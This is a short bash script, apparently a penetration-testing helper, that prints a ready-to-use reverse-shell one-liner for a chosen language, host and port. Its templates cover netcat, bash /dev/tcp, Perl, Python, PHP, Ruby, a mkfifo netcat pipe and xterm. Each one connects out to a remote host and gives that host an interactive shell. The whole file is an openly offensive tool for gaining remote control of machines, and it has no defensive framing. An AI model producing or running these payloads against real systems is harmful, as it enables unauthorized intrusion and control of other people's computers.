#!/bin/bash

set -e
set -u
set -o pipefail

lang=false
host=${RS_HOST:-}
port="1337"

while getopts 'l:h:p:' OPTION; do
  case "$OPTION" in
    l)
      lang="$OPTARG"
      ;;
    h)
      host="$OPTARG"
      ;;
    p)
      port="$OPTARG"
      ;;
    ?)
      echo "script usage: $0   [-l language] [-h host] [-p port]" 
      echo "[-h host] setting an RS_HOST=<host> ENV variable will be used as default otherwise, provide host"
      exit 1
      ;;
  esac
done

if [[ $OPTIND == 1 ]]; then
  echo "script usage: $0   [-l language] [-h host] [-p port]" 
  echo "[-h host] setting an RS_HOST=<host> ENV variable will be used as default otherwise, provide host"
  exit 1
fi

shift "$(($OPTIND -1))"

if [[ ! $lang ]] || [[ -z $host ]]; then
  echo "[-l language] and [-h host] must be included"
  echo "[-h host] setting an RS_HOST=<host> ENV variable will be used as default otherwise, provide host"
  exit 1
fi

declare -A LANGS

LANGS["nc"]="nc -e /bin/sh HOST PORT"
LANGS["bash"]="bash -i >& /dev/tcp/HOST/PORT 0>&1"
LANGS["perl"]="perl -e 'use Socket;\$i=\"HOST\";\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
LANGS["python"]="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"HOST\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
LANGS["php"]="php -r '\$sock=fsockopen(\"HOST\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
LANGS["ruby"]="ruby -rsocket -e'f=TCPSocket.open(\"HOST\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
LANGS["ncs"]="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc HOST PORT >/tmp/f"
LANGS["xterm"]="xterm -display HOST:1"

if [[ "${LANGS[$lang]:-false}" == "false" ]]; then
  echo "no reverse shell for [$lang] found"
  exit 1
fi

echo "${LANGS[$lang]}" | sed -e "s/HOST/$host/g" -e "s/PORT/$port/g"
